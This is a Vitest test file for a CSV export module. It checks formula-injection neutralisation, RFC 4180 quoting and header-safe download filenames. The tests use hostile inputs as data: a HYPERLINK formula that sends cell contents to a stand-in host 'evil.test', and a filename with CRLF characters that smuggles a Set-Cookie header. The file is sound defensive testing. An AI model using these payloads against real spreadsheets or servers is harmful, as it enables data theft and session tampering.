import { describe, expect, it } from 'vitest';
import { attachment, csvCell, toCsv, UTF8_BOM } from '@/lib/csv';

describe('csv', () => {
  describe('formula injection', () => {
    // The hazard is not theoretical and not about commas. A cell beginning
    // with one of these is executed by Excel, Sheets and LibreOffice, and on a
    // ledger the attacker's input channel is "type an entry description".
    it.each(['=1+1', '+1', '-1', '@SUM(A1)', '\tx', '\rx'])('neutralises %j', (payload) => {
      expect(csvCell(payload).replace(/^"/u, '')).toMatch(/^'/u);
    });

    it('neutralises the exfiltration payload specifically', () => {
      const attack = '=HYPERLINK("http://evil.test/?"&A1,"Click me")';
      const cell = csvCell(attack);
      // Quoted *and* prefixed: quoting alone still leaves a formula, because
      // the quotes are consumed by the CSV parser before the formula parser
      // ever sees the text.
      expect(cell.startsWith(`"'=`)).toBe(true);
    });

    it('leaves ordinary text alone', () => {
      expect(csvCell('Coffee beans')).toBe('Coffee beans');
      expect(csvCell('1234.56')).toBe('1234.56');
    });
  });

  describe('RFC 4180', () => {
    it('quotes fields containing a comma, quote or newline', () => {
      expect(csvCell('a,b')).toBe('"a,b"');
      expect(csvCell('say "hi"')).toBe('"say ""hi"""');
      expect(csvCell('line\nbreak')).toBe('"line\nbreak"');
    });

    it('writes an empty cell for null and undefined rather than the words', () => {
      expect(csvCell(null)).toBe('');
      expect(csvCell(undefined)).toBe('');
    });

    it('separates records with CRLF', () => {
      const csv = toCsv(['a', 'b'], [['1', '2']]);
      expect(csv).toBe(`${UTF8_BOM}a,b\r\n1,2\r\n`);
    });

    it('opens with a UTF-8 byte-order mark', () => {
      // Without it Excel on Windows guesses the system codepage and every
      // non-ASCII account name arrives as mojibake.
      expect(toCsv(['name'], [['Café']]).startsWith(UTF8_BOM)).toBe(true);
    });
  });

  describe('content-disposition', () => {
    it('carries both an ASCII and an encoded filename', () => {
      const header = attachment('Café statement.csv');
      expect(header).toContain('filename="Caf__statement.csv"');
      expect(header).toContain("filename*=UTF-8''Caf%C3%A9%20statement.csv");
    });

    it('cannot be used to inject a second header', () => {
      // A name is user data — an account is named by whoever opened it.
      const header = attachment('evil"\r\nSet-Cookie: a=b.csv');
      expect(header).not.toContain('\r');
      expect(header).not.toContain('\n');
      expect(header.match(/"/gu)).toHaveLength(2);
    });
  });
});
